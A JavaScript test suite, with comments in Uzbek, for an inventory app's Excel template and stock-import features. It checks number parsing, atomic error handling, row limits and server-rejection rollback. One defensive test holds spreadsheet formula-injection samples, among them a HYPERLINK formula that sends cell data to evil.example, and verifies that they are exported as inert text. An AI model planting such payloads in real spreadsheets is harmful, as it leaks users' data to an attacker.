// P46 — v24.5 (v23.10.2 P28 dan): Excel shablon va Kirim (bosh qoldiq) importi (HAQIQIY ExcelJS 4.4.0 — sayt CDN'dagi bilan bir xil versiya).
//  • Yagona shablon: Kirim «Shablon» va «Excel orqali bosh qoldiq» oynasidagi tugma — bitta fayl («Shablon» + «Yo'riqnoma»),
//    namuna qatori NAMUNA-… (import qilinmaydi), tekshiruv qoidalari.
//  • Import: formula, rich text, havola, «15,10», «1 000» to'g'ri o'qiladi; namuna o'tkazib yuboriladi.
//  • Xato faylda (matn miqdor, kasr dona, tannarxsiz miqdor, nomsiz yangi mahsulot) — HECH NARSA o'zgarmaydi, xatolar qator raqami bilan
//    (avval parseInt/parseFloat — «o'n» → jimgina 0, «2.5» dona → 2).
//  • Qator chegarasi (20 000) — aniq xato, hech narsa yozilmaydi.
//  • Server kirimni rad etsa — mahsulotlar AYNAN oldingi holatda (obyektlar ham o'sha), rasm yuklanmaydi.
//  • Formula in'eksiyasi: «=HYPERLINK(...)» eksportda MATN (xlsx XML'ida <f> yo'q, t="s"), qayta o'qilganda — satr; «@» formati.
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const zlib = require('zlib');
const { loadApp, ROOT } = require('./helpers/load-app');

function excelJsPath() {
  const cands = [process.env.FW_CDN_DIR && path.join(process.env.FW_CDN_DIR, 'exceljs@4.4.0', 'package', 'dist', 'exceljs.min.js'),
    path.join(require('os').tmpdir(), 'fw-cdn-cache', 'exceljs@4.4.0', 'package', 'dist', 'exceljs.min.js'), // p42 testi yaratadigan standart kesh
    path.join(ROOT, 'node_modules', 'exceljs', 'dist', 'exceljs.min.js')].filter(Boolean);
  const p = cands.find(x => fs.existsSync(x));
  if (!p) throw new Error('exceljs 4.4.0 topilmadi — FW_CDN_DIR ni bering (p42 testidagi kabi)');
  return p;
}

// .xlsx (zip) ichidan bitta faylni o'qish — tashqi kutubxonasiz (markaziy katalog → local header → inflateRaw)
function unzipEntry(buf, name) {
  let eocd = buf.length - 22; while (eocd >= 0 && buf.readUInt32LE(eocd) !== 0x06054b50) eocd--;
  const n = buf.readUInt16LE(eocd + 10); let p = buf.readUInt32LE(eocd + 16);
  for (let i = 0; i < n; i++) {
    const method = buf.readUInt16LE(p + 10), csize = buf.readUInt32LE(p + 20);
    const fnl = buf.readUInt16LE(p + 28), exl = buf.readUInt16LE(p + 30), cml = buf.readUInt16LE(p + 32), loff = buf.readUInt32LE(p + 42);
    const fname = buf.slice(p + 46, p + 46 + fnl).toString();
    if (fname === name) {
      const ds = loff + 30 + buf.readUInt16LE(loff + 26) + buf.readUInt16LE(loff + 28);
      const data = buf.slice(ds, ds + csize);
      return (method === 0 ? data : zlib.inflateRawSync(data)).toString('utf8');
    }
    p += 46 + fnl + exl + cml;
  }
  return null;
}

async function withXlApp(fn, mockRoutes = []) {
  const { browser, page, consoleErrors } = await loadApp({ mockRoutes });
  try {
    await page.addScriptTag({ path: excelJsPath() });
    await page.evaluate(() => {
      document.body.insertAdjacentHTML('beforeend', '<div id="modal-ov"></div><div id="bs-ov" hidden></div>');
      save = () => {}; pgKirim = () => {}; pgMahsulotlar = () => {}; uploadImageToStorage = async () => null;
      _cloudEnabled = false; CUR.usdUzs = 12800; CUR.usdCny = 7; CUR.BANK_FEE = 0.006;
      Object.assign(S, { branch: 'baza', batchCounter: 0, batches: [], sales: [], settings: {},
        products: [{ id: 501, sku: 'OLD-1', name: 'Eski drel', cat: 'Asbob', brand: 'Bosch', unit: 'dona', markupPct: 25, optMarkupPct: 15 },
                   { id: 502, sku: 'KAB-1', name: 'Kabel', cat: 'Elektr', unit: 'metr', markupPct: 25, optMarkupPct: 15 }],
        suppliers: [{ id: 5, name: "Ta'minotchi", debt: 0 }] });
      // v23 dagi kabi to'liq maydonlar (valyuta/ta'minotchi) — importBatchXlsx hisob mantig'i o'zgarmaganini tekshirish uchun
      window.__xlImport = async (buf, cur = 'USD') => {
        document.querySelectorAll('#ei-host').forEach(e => e.remove());
        document.body.insertAdjacentHTML('beforeend', `<div id="ei-host"><input type="file" id="ei-file"><select id="ei-cur"><option value="${cur}" selected>c</option></select>
          <select id="ei-supp"><option value="5" selected>T</option></select><input id="ei-freight" value="0"><input id="ei-customs" value="0">
          <select id="ei-customs-method"><option value="per_unit" selected>d</option></select><button id="ei-submit-btn">📤 Import qilish</button></div>`);
        const dt = new DataTransfer(); dt.items.add(new File([buf], 'kirim.xlsx')); document.getElementById('ei-file').files = dt.files;
        await importBatchXlsx();
      };
      // v24.5 ning haqiqiy oynasi (bosh qoldiq: valyuta/ta'minotchi maydonlari yo'q)
      window.__xlImportModal = async (buf, suppId) => {
        document.querySelectorAll('#ei-host').forEach(e => e.remove());
        openExcelImportModal();
        if (suppId) { const sel = document.getElementById('ei-supp'); sel.value = String(suppId); sel.dispatchEvent(new Event('change')); window.__eiNote = document.getElementById('ei-supp-note').textContent; }
        const dt = new DataTransfer(); dt.items.add(new File([buf], 'qoldiq.xlsx')); document.getElementById('ei-file').files = dt.files;
        await importBatchXlsx();
      };
    });
    await fn(page);
    assert.deepEqual(consoleErrors, [], "sahifada JS xatosi yo'q");
  } finally { await browser.close(); }
}

async function testTemplate() {
  await withXlApp(async (page) => {
    const r = await page.evaluate(async () => {
      let dl = []; const realClick = HTMLAnchorElement.prototype.click;
      HTMLAnchorElement.prototype.click = function () { dl.push(this.download); };
      const blobs = []; const realCreate = URL.createObjectURL; URL.createObjectURL = (b) => { blobs.push(b); return realCreate(b); };
      await exportImportTemplate();     // Kirim sahifasidagi «Shablon»
      openExcelImportModal();           // «Excel orqali bosh qoldiq» oynasi
      const btn = [...document.querySelectorAll('#modal-ov button')].find(b => /Shablonni yuklab olish/.test(b.textContent));
      btn.click(); await new Promise(r => setTimeout(r, 300));
      HTMLAnchorElement.prototype.click = realClick;
      const wb = new ExcelJS.Workbook(); await wb.xlsx.load(await blobs[0].arrayBuffer());
      const ws = wb.getWorksheet('Shablon');
      const wb2 = new ExcelJS.Workbook(); await wb2.xlsx.load(await blobs[1].arrayBuffer());
      const dump = (w) => JSON.stringify(w.worksheets.map(s => [s.name, s.getSheetValues ? s.getSheetValues().map(r => r && r.slice ? r.slice(1) : r) : null]));
      return { dl, nBlobs: blobs.length, same: dump(wb) === dump(wb2), sheets: wb.worksheets.map(w => w.name),
        head: ws.getRow(1).values.slice(1), sample: ws.getRow(2).values.slice(1),
        dvF: ws.getCell('F10').dataValidation?.type, dvG: ws.getCell('H100').dataValidation?.type,
        guide: wb.getWorksheet("Yo'riqnoma").getRow(3).values.slice(1).join(' | ') };
    });
    assert.deepEqual(r.dl, ['shablon.xlsx', 'shablon.xlsx'], 'ikkala tugma — bitta shablon fayli');
    assert.equal(r.nBlobs, 2); assert.equal(r.same, true, 'ikkala shablon mazmuni bir xil');
    assert.deepEqual(r.sheets, ['Shablon', "Yo'riqnoma"]);
    assert.equal(r.head.length, 9); assert.equal(r.head[0], 'Rasm'); assert.equal(r.head[1], 'SKU (Kod)'); assert.equal(r.head[5], 'Miqdor');
    assert.match(String(r.sample[1]), /^NAMUNA-/, 'namuna qatori belgilangan');
    assert.equal(r.dvF, 'decimal'); assert.equal(r.dvG, 'decimal', 'miqdor/narx kataklarida tekshiruv');
    assert.match(r.guide, /MAJBURIY/);
  });
}

async function testImportReal() {
  await withXlApp(async (page) => {
    const r = await page.evaluate(async () => {
      const wb = await fwBuildXlTemplate(); const ws = wb.getWorksheet('Shablon');
      ws.addRow(['', 'NEW-1', 'Yangi disk', 'Asbob', 'Makita', 10, '15,10', '1 000', '']);                 // vergulli kasr, bo'shliqli son
      ws.addRow(['', { richText: [{ text: 'OLD' }, { text: '-1' }] }, '', '', '', { formula: 'B1', result: 4 }, { formula: '2*3', result: 6 }, '', '']);  // rich text SKU, formula
      ws.addRow(['', { text: 'KAB-1', hyperlink: 'https://x' }, '', '', '', 2.5, 1.2, '', '']);             // havola; metr — kasr miqdor
      ws.addRow(['', 'INFO-1', 'Faqat maʼlumot', 'Boshqa', '', '', '', '', '']);                            // kirimsiz — faqat mahsulot
      const buf = await wb.xlsx.writeBuffer();
      await __xlImport(buf);
      const by = (sku) => S.products.find(p => p.sku === sku);
      const bat = (sku) => S.batches.find(b => b.pid === by(sku)?.id);
      return { prods: S.products.map(p => p.sku).sort(), sample: !!S.products.find(p => /^NAMUNA/.test(p.sku)),
        objStr: JSON.stringify(S.products).includes('[object Object]'),
        new1: { qty: bat('NEW-1')?.qty, cost: bat('NEW-1')?.costUsd, name: by('NEW-1')?.name, mk: by('NEW-1')?.markupPct },
        old1: { qty: bat('OLD-1')?.qty, cost: bat('OLD-1')?.costUsd, name: by('OLD-1')?.name, brand: by('OLD-1')?.brand },
        kab: bat('KAB-1')?.qty, info: !!bat('INFO-1'), batches: S.batches.length, debt: Math.round(S.suppliers[0].debt * 100) / 100 };
    });
    assert.equal(r.sample, false, "namuna qatori import qilinmadi");
    assert.equal(r.objStr, false, "«[object Object]» yo'q");
    assert.deepEqual(r.prods, ['INFO-1', 'KAB-1', 'NEW-1', 'OLD-1']);
    assert.deepEqual(r.new1, { qty: 10, cost: 15.1, name: 'Yangi disk', mk: Math.round(((1000 / 15.1) - 1) * 1000000) / 10000 }, "«15,10» va «1 000» to'g'ri o'qildi");
    assert.deepEqual(r.old1, { qty: 4, cost: 6, name: 'Eski drel', brand: 'Bosch' }, "rich text SKU, formula natijasi; bo'sh nom/brend — o'zgarmaydi");
    assert.equal(r.kab, 2.5, 'metr — kasr miqdor qabul qilinadi'); assert.equal(r.info, false); assert.equal(r.batches, 3);
    assert.equal(r.debt, Math.round((10 * 15.1 + 4 * 6 + 2.5 * 1.2) * 100) / 100, "ta'minotchi qarzi — faqat haqiqiy qatorlar");
  });
}

// v24.5 ning haqiqiy «bosh qoldiq» oynasi orqali (valyuta/ta'minotchi maydonlari yo'q) — $, qarzsiz, «Bosh qoldiq (Excel)»
async function testOpeningModal() {
  await withXlApp(async (page) => {
    const r = await page.evaluate(async () => {
      const wb = await fwBuildXlTemplate(); const ws = wb.getWorksheet('Shablon');
      ws.addRow(['', 'OP-1', 'Bosh qoldiq', 'Asbob', '', 7, 3.5, '', '']);
      await __xlImportModal(await wb.xlsx.writeBuffer());
      const p = S.products.find(x => x.sku === 'OP-1'); const b = S.batches.find(x => x.pid === p?.id);
      return { qty: b?.qty, cost: b?.costUsd, origin: b?.origin, supp: b?.suppId, debt: S.suppliers[0].debt };
    });
    assert.deepEqual(r, { qty: 7, cost: 3.5, origin: 'Bosh qoldiq (Excel)', supp: null, debt: 0 });
  });
}

// v24.6 (egasi talabi): haqiqiy oynada ta'minotchi tanlanadi — partiya unga bog'lanadi, tovar summasi qarziga yoziladi
async function testModalSupplier() {
  await withXlApp(async (page) => {
    const r = await page.evaluate(async () => {
      const wb = await fwBuildXlTemplate(); const ws = wb.getWorksheet('Shablon');
      ws.addRow(['', 'SP-1', 'Taʼminotchidan', 'Asbob', '', 4, 2.5, '', '']);
      const sid = S.suppliers[0].id, d0 = S.suppliers[0].debt || 0;
      openExcelImportModal(); const opts = [...document.querySelectorAll('#ei-supp option')].map(o => o.value); closeModal();
      await __xlImportModal(await wb.xlsx.writeBuffer(), sid);
      const p = S.products.find(x => x.sku === 'SP-1'); const b = S.batches.find(x => x.pid === p?.id);
      return { opts: opts.length === S.suppliers.length + 1 && opts[0] === '', supp: b?.suppId === sid, origin: b?.origin, debt: Math.round(((S.suppliers[0].debt || 0) - d0) * 100) / 100, note: /qarziga yoziladi/.test(window.__eiNote || '') };
    });
    assert.deepEqual(r, { opts: true, supp: true, origin: 'Excel import', debt: 10, note: true });
  });
}

async function testImportErrorsAtomic() {
  await withXlApp(async (page) => {
    const r = await page.evaluate(async () => {
      const before = JSON.stringify({ p: S.products, b: S.batches, s: S.suppliers });
      const wb = await fwBuildXlTemplate(); const ws = wb.getWorksheet('Shablon');
      ws.addRow(['', 'OK-1', 'Toʻgʻri qator', '', '', 5, 2, '', '']);
      ws.addRow(['', 'BAD-1', 'Matn miqdor', '', '', 'oʻn', 2, '', '']);
      ws.addRow(['', 'BAD-2', 'Kasr dona', '', '', 2.5, 2, '', '']);
      ws.addRow(['', 'BAD-3', 'Tannarxsiz', '', '', 3, '', '', '']);
      ws.addRow(['', 'BAD-4', '', '', '', 3, 1, '', '']);
      ws.addRow(['', '', 'Kodsiz', '', '', 3, 1, '', '']);
      ws.addRow(['', 'BAD-5', 'Harfli son', '', '', '12a', '3x', '', '']);   // avval parseInt('12a') → 12, parseFloat('3x') → 3 (jimgina)
      await __xlImport(await wb.xlsx.writeBuffer());
      const txt = document.getElementById('modal-ov').textContent;
      return { same: before === JSON.stringify({ p: S.products, b: S.batches, s: S.suppliers }), txt,
        btn: document.getElementById('ei-submit-btn').disabled, label: document.getElementById('ei-submit-btn').textContent };
    });
    assert.equal(r.same, true, "xato bo'lsa — mahsulot, ombor, qarz o'zgarmaydi (to'g'ri qator ham yozilmaydi)");
    assert.match(r.txt, /7 ta xato/);
    for (const re of [/4-qator \(BAD-1\): miqdor noto'g'ri — «oʻn»/, /5-qator \(BAD-2\).*butun son/, /6-qator \(BAD-3\).*tannarx yo'q/, /7-qator \(BAD-4\).*nomi bo'sh/, /8-qator: SKU/,
      /9-qator \(BAD-5\): miqdor noto'g'ri — «12a»/, /9-qator \(BAD-5\): tannarx noto'g'ri — «3x»/]) assert.match(r.txt, re);
    assert.equal(r.btn, false, 'tugma qayta faol'); assert.equal(r.label, '📤 Import qilish', 'tugma yozuvi asl holiga qaytdi');
  });
}

async function testNumParse() {
  await withXlApp(async (page) => {
    const r = await page.evaluate(() => ['15,10', '1 000', '1 000,5', '1,000.50', '$15', '1,000,000', '', 'abc', '12a', { formula: 'x', result: 7 }, { error: '#N/A' }, 3, '1e3', 'Infinity']
      .map(v => { const n = xlNum(v); return Number.isNaN(n) ? 'NaN' : n; }));
    assert.deepEqual(r, [15.1, 1000, 1000.5, 1000.5, 15, 1000000, 0, 'NaN', 'NaN', 7, 0, 3, 'NaN', 'NaN']);
  });
}

// Manfiy miqdor/narx, SKU boshidagi nol
async function testNegativeAndLeadingZero() {
  await withXlApp(async (page) => {
    const r = await page.evaluate(async () => {
      const wb = await fwBuildXlTemplate(); const ws = wb.getWorksheet('Shablon');
      ws.addRow(['', 'NEG-1', 'Manfiy miqdor', '', '', -5, 2, '', '']);
      ws.addRow(['', 'NEG-2', 'Manfiy narx', '', '', 5, -2, '', '']);
      ws.addRow(['', 'NEG-3', 'Manfiy chakana', '', '', 5, 2, -1, '']);
      await __xlImport(await wb.xlsx.writeBuffer());
      const txt = document.getElementById('modal-ov').textContent;
      const negOk = S.products.length === 2 && S.batches.length === 0;
      closeModal && closeModal();
      const wb2 = await fwBuildXlTemplate(); const ws2 = wb2.getWorksheet('Shablon');
      ws2.addRow(['', '007', 'Nol bilan kod', 'Asbob', '', 4, 3, '', '']);
      const fmtB = ws2.getColumn(2).numFmt;
      await __xlImport(await wb2.xlsx.writeBuffer());
      const p = S.products.find(x => x.name === 'Nol bilan kod');
      return { txt, negOk, fmtB, sku: p && p.sku, batch: S.batches.find(b => b.pid === (p && p.id))?.qty };
    });
    assert.equal(r.negOk, true, "manfiy qiymatli fayl — hech narsa yozilmadi");
    for (const re of [/3 ta xato/, /3-qator \(NEG-1\): miqdor/, /4-qator \(NEG-2\): tannarx/, /5-qator \(NEG-3\): chakana/]) assert.match(r.txt, re);
    assert.equal(r.fmtB, '@', 'shablonda SKU ustuni — matn');
    assert.equal(r.sku, '007', 'boshidagi nol saqlandi'); assert.equal(r.batch, 4);
  });
}

// v24.5: qator chegarasi — 20 000 dan ko'p qatorli fayl aniq xato bilan rad etiladi, hech narsa yozilmaydi
async function testRowLimit() {
  await withXlApp(async (page) => {
    const r = await page.evaluate(async () => {
      const before = JSON.stringify({ p: S.products, b: S.batches });
      const wb = await fwBuildXlTemplate(); const ws = wb.getWorksheet('Shablon');
      for (let i = 1; i <= XL_MAX_ROWS + 1; i++) ws.addRow(['', 'R-' + i, 'Q ' + i, '', '', 1, 1, '', '']);
      await __xlImport(await wb.xlsx.writeBuffer());
      const txt = document.getElementById('modal-ov').textContent;
      return { lim: XL_MAX_ROWS, same: before === JSON.stringify({ p: S.products, b: S.batches }), txt, btn: document.getElementById('ei-submit-btn').disabled,
        big: xlFileGuard({ size: 51 * 1024 * 1024 }), small: xlFileGuard({ size: 1024 }) };
    });
    assert.equal(r.lim, 20000);
    assert.equal(r.same, true, "chegaradan oshgan fayl — hech narsa yozilmadi");
    assert.match(r.txt, /20002 ta qator — bir yo'la eng ko'pi 20000 ta/);
    assert.equal(r.btn, false);
    assert.match(r.big, /Fayl juda katta/); assert.equal(r.small, null);
  });
}

// Server kirimni rad etsa — mahsulotlar, partiyalar, qarz o'zgarmaydi; rasm yuklanmaydi; mahsulot obyektlari o'sha
async function testServerRejectWritesNothing() {
  let calls = 0;
  await withXlApp(async (page) => {
    const r = await page.evaluate(async () => {
      _cloudEnabled = true; FWL.on = true;
      let uploads = 0; uploadImageToStorage = async () => { uploads++; return 'https://x/y.jpg'; };
      const before = JSON.stringify({ p: S.products, b: S.batches, s: S.suppliers });
      const ref = S.products[0];
      const wb = await fwBuildXlTemplate(); const ws = wb.getWorksheet('Shablon');
      ws.addRow(['', 'NEW-9', 'Yangi', '', '', 3, 2, '', '']);
      ws.addRow(['', 'OLD-1', 'Eski drel — yangi nom', 'Yangi kat', '', 2, 5, '', '']);
      await __xlImport(await wb.xlsx.writeBuffer());
      return { same: before === JSON.stringify({ p: S.products, b: S.batches, s: S.suppliers }), uploads,
        sameObj: S.products[0] === ref, btn: document.getElementById('ei-submit-btn').disabled };
    });
    assert.equal(r.same, true, "server rad etdi — yangi mahsulot ham, nom o'zgarishi ham qaytarildi");
    assert.equal(r.sameObj, true, "mahsulot obyekti almashtirilmadi (savat va boshqa havolalar eskirmaydi)");
    assert.equal(r.uploads, 0, 'rasm yuklanmadi'); assert.equal(r.btn, false);
  }, [{ url: '**/.netlify/functions/stock-debt-ops', handler: (route) => { calls++; route.fulfill({ status: 400, contentType: 'application/json', body: JSON.stringify({ error: "LEDGER: test rad" }) }); } }]);
  assert.equal(calls, 1, 'server bir marta chaqirildi');
}

// v24.5: formula in'eksiyasi — eksportdagi «=HYPERLINK(...)» satri formula EMAS, matn sifatida yoziladi
async function testFormulaInjectionExport() {
  let xmls;
  await withXlApp(async (page) => {
    const r = await page.evaluate(async () => {
      const blobs = []; const realCreate = URL.createObjectURL; URL.createObjectURL = (b) => { blobs.push(b); return realCreate(b); };
      const realClick = HTMLAnchorElement.prototype.click; HTMLAnchorElement.prototype.click = function () {};
      const evil = ['=HYPERLINK("http://evil.example/?x="&A1,"bos")', '+1+2', '-2+3', '@SUM(1,2)', '\t=1+1', 'Oddiy'];
      S.products = evil.map((n, i) => ({ id: 900 + i, sku: 'E' + i, name: n, cat: evil[i], brand: '', unit: 'dona', minStock: 0, maxStock: 1 }));
      await exportProducts();
      HTMLAnchorElement.prototype.click = realClick;
      const buf = await blobs[0].arrayBuffer();
      const wb = new ExcelJS.Workbook(); await wb.xlsx.load(buf);
      const ws = wb.worksheets[0];
      const cells = evil.map((_, i) => { const c = ws.getCell(i + 2, 2); return { v: c.value, type: c.type, f: c.formula || null, fmt: c.numFmt || null }; });
      const plain = ws.getCell(evil.length + 1, 2);
      // nazorat: haqiqiy formula obyekti yozilsa — XML'da <f> BOR (tekshiruv bo'sh emasligini isbotlaydi)
      const ctl = new ExcelJS.Workbook(); ctl.addWorksheet('S').addRow(['x', { formula: '1+1', result: 2 }]);
      const ctlBuf = await ctl.xlsx.writeBuffer();
      return { cells, plainFmt: plain.numFmt || null, STRING: ExcelJS.ValueType.String, FORMULA: ExcelJS.ValueType.Formula,
        b64: btoa(String.fromCharCode(...new Uint8Array(buf))), ctl: btoa(String.fromCharCode(...new Uint8Array(ctlBuf))), evil };
    });
    r.cells.forEach((c, i) => {
      assert.equal(c.v, r.evil[i], 'qiymat aynan saqlandi'); assert.equal(c.type, r.STRING, `${i}: satr turi (formula emas)`);
      assert.notEqual(c.type, r.FORMULA); assert.equal(c.f, null);
      if (i < 5) assert.equal(c.fmt, '@', `${i}: «@» (Matn) formati — tahrirlansa ham formula bo'lmaydi`);
    });
    assert.notEqual(r.plainFmt, '@', 'oddiy matnga format qo\'yilmaydi');
    const buf = Buffer.from(r.b64, 'base64');
    xmls = { sheet: unzipEntry(buf, 'xl/worksheets/sheet1.xml'), ss: unzipEntry(buf, 'xl/sharedStrings.xml'),
      ctl: unzipEntry(Buffer.from(r.ctl, 'base64'), 'xl/worksheets/sheet1.xml') };
  });
  assert.ok(xmls.sheet && xmls.ss, 'xlsx ichidagi varaq va satrlar o\'qildi');
  assert.match(xmls.ctl, /<f>1\+1<\/f>/, 'nazorat: formula obyekti XML\'da <f> bo\'lib yoziladi');
  assert.doesNotMatch(xmls.sheet, /<f[\s>]/, 'varaq XML\'ida birorta ham formula (<f>) yo\'q');
  assert.match(xmls.ss, /=HYPERLINK\(/, 'satr umumiy satrlar jadvalida (matn)');
  const bCells = [...xmls.sheet.matchAll(/<c r="B(\d+)"([^>]*)>/g)].filter(m => +m[1] >= 2);
  assert.equal(bCells.length, 6); bCells.forEach(m => assert.match(m[2], /t="s"/, `B${m[1]} — t="s" (matn)`));
}

module.exports = {
  name: "P46 — v24.5 (v23.10.2 P28 dan): Excel shablon va Kirim importi (haqiqiy ExcelJS), formula in'eksiyasi, qator chegarasi",
  cases: [
    { name: "Shablon: bitta fayl ikkala tugmada (Kirim «Shablon» + bosh qoldiq oynasi), Yo'riqnoma varag'i, NAMUNA qatori, tekshiruv qoidalari", run: testTemplate },
    { name: "Import: formula, rich text, havola, «15,10», «1 000», metr kasr; namuna o'tkazib yuboriladi; qarz to'g'ri", run: testImportReal },
    { name: "Bosh qoldiq oynasi (v24.5): $ va ta'minotchisiz — «Bosh qoldiq (Excel)» partiyasi", run: testOpeningModal },
    { name: "Excel kirim oynasi (v24.6): ta'minotchi tanlanadi — partiya bog'lanadi, qarz = tannarx × miqdor", run: testModalSupplier },
    { name: "Xato fayl: hech narsa yozilmaydi, xatolar qator raqami bilan (matn/harfli son — jimgina 0 emas)", run: testImportErrorsAtomic },
    { name: "Son o'qish: vergul, bo'shliq, minglik ajratgich, formula, xato katak", run: testNumParse },
    { name: "Manfiy miqdor/narx — rad (hech narsa yozilmaydi); SKU boshidagi nol saqlanadi", run: testNegativeAndLeadingZero },
    { name: "Qator chegarasi 20 000 va fayl hajmi 50 MB — aniq xato, hech narsa yozilmaydi", run: testRowLimit },
    { name: "Server kirimni rad etsa — mahsulot (obyekt ham), partiya, qarz o'zgarmaydi, rasm yuklanmaydi", run: testServerRejectWritesNothing },
    { name: "Formula in'eksiyasi: «=HYPERLINK(...)» eksportda matn (t=\"s\", <f> yo'q), qayta o'qilganda satr, «@» format", run: testFormulaInjectionExport },
  ],
};
